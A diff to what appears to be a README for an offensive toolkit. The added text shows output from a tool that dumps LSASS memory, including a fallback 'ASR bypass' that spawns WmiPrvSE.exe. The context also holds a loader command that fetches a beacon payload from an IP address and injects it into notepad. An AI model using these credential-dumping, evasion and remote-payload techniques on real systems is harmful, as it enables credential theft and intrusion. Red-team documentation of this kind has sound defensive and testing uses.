@@ -99,7 +99,8 @@ C:\>KarenLdr.exe -u "https://192.168.231.128:443/beacon.bin" -t notepad -p 9524 
 
 ## KarenDumpedMi
 ```
-C:\Users\Wesley\source\repos\KarenDumpedMi\KarenDumpedMi\bin\Debug>KarenDumpedMi.exe
+**Method 1:**
+C:\>KarenDumpedMi.exe
 
      _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
     | \    /\(  ___  )(  ____ )(  ____ \( (    /|(  __  \ |\     /|(       )(  ____ )(  ____ \(  __  \ (       )\__   __/
@@ -124,6 +125,36 @@ C:\Users\Wesley\source\repos\KarenDumpedMi\KarenDumpedMi\bin\Debug>KarenDumpedMi
 [>] Invoking MiniDumpWriteDump
     |-> Successfully Called MiniDumpWriteDump()
     |-> COMPLETED! You can now parse karen.dmp!
+    
+**Method 2:**
+C:\>KarenDumpedMi.exe
+
+     _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
+    | \    /\(  ___  )(  ____ )(  ____ \( (    /|(  __  \ |\     /|(       )(  ____ )(  ____ \(  __  \ (       )\__   __/
+    |  \  / /| (   ) || (    )|| (    \/|  \  ( || (  \  )| )   ( || () () || (    )|| (    \/| (  \  )| () () |   ) (
+    |  (_/ / | (___) || (____)|| (__    |   \ | || |   ) || |   | || || || || (____)|| (__    | |   ) || || || |   | |
+    |   _ (  |  ___  ||     __)|  __)   | (\ \) || |   | || |   | || |(_)| ||  _____)|  __)   | |   | || |(_)| |   | |
+    |  ( \ \ | (   ) || (\ (   | (      | | \   || |   ) || |   | || |   | || (      | (      | |   ) || |   | |   | |
+    |  /  \ \| )   ( || ) \ \__| (____/\| )  \  || (__/  )| (___) || )   ( || )      | (____/\| (__/  )| )   ( |___) (___
+    |_/    \/|/     \||/   \__/(_______/|/    )_)(______/ (_______)|/     \||/       (_______/(______/ |/     \|\_______/
+
+[>] Finding Alive Process
+    |-> Found lsass.exe
+    |-> PID: 920
+
+[>] Finding MiniDumpWriteDump
+    |-> Location of MiniDumpWriteDump(): 0x7FFD7E8F6C50
+
+[>] Getting Handles
+    |-> Unable to Open Process Handle!
+
+[>] Method 1 Failed! Trying Method 2
+    |-> Dumping LSASS With ASR Bypass!
+
+[>] Spawning WmiPrvSE.exe
+    |-> PID: 20856
+
+[>] COMPLETED! You can now parse lsass.dmp!
 ```
 
 ## Karen2Gadget
